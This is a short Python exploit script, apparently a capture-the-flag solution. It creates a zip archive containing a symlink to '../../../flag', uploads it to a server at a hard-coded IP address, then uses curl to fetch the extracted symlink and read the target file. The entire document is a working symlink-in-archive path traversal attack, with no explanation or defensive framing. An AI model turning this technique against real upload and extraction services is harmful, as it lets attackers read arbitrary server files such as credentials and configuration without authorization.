import os
import requests

os.system('ln -sfn ../../../flag coba.txt')
os.system('zip test.zip coba.txt --symlink')

files = {'file': ('test.zip', open('test.zip', 'rb'), 'application/zip')}
response = requests.post('http://52.59.124.14:10015/', files=files)

print(response.text)

if "coba.txt" in response.text:
    filepath = response.text.strip()
    filepath_parts = filepath.split("/")
    directory = filepath_parts[-2]
    url = f"http://52.59.124.14:10016/{directory}/coba.txt"
    os.system(f"curl -v {url}")